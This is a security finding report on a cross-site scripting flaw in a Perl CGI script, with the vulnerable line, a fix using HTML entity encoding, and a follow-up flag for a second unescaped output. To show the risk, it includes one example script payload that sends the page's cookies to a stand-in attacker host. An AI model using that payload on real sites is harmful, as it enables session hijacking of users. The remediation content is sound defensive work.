## Verdict

- **cwe_id**: CWE-79 (Improper Neutralization of Input During Web Page Generation / Cross-Site Scripting)
- **location**: `CgiParamUnescapedOutput.pl`, line 18
- **verdict**: exploitable
- **confidence**: high

## Source

`$cgi->param('note')` (line 18) - a CGI query/POST parameter read via `CGI->new`. This is attacker-controlled HTTP request data with no validation or transformation applied between the read and the point it is printed.

## Fix

**Vulnerable code:**

```perl
print "<p>Customer note: " . $cgi->param('note') . "</p>\n";
```

The value returned by `$cgi->param('note')` is concatenated directly into an HTML string and written to the response body. Nothing escapes `<`, `>`, `&`, or quote characters, so a note such as `<script>document.location='//evil.example/?c='+document.cookie</script>` is emitted verbatim into the page and executes in the viewer's browser - stored or reflected depending on whether the note is echoed back on the same request or persisted and shown later.

**Fixed code:**

```perl
use HTML::Entities;
...
print "<p>Customer note: " . encode_entities($cgi->param('note')) . "</p>\n";
```

(`use HTML::Entities;` added to the module's `use` block alongside the existing `use CGI;`.)

## Explanation

The sink is HTML body text, so the correct defence is context-appropriate output encoding at the point of print, not input filtering. `HTML::Entities::encode_entities()` escapes the characters that let attacker-controlled text break out of the surrounding markup and be interpreted as a new tag or script (`<`, `>`, `&`, `"`, `'`), so the note value is always rendered as inert text inside the `<p>` element regardless of what it contains. The call is applied directly at the sink identified in the trace, matching the knowledge base's guidance to encode at each output point rather than relying on upstream validation.

## Behaviour changes

- Any note containing `<`, `>`, `&`, `"`, or `'` now renders as the literal escaped text (e.g. `&lt;`) instead of being interpreted as HTML/script by the browser. This is the intended effect of the fix - previously such characters passed through unmodified and could both alter page structure and execute script.
- No change to the response header, status, `ticket_id` handling, or any other output. `print $cgi->header;` and the surrounding HTML are untouched.
- Note (not modified, out of scope for this finding): line 14 interpolates `$ticket_id` into the page with the same unescaped pattern. It was not touched here since the reported finding is scoped to line 18, but it is worth flagging for a follow-up fix using the same `encode_entities()` pattern.
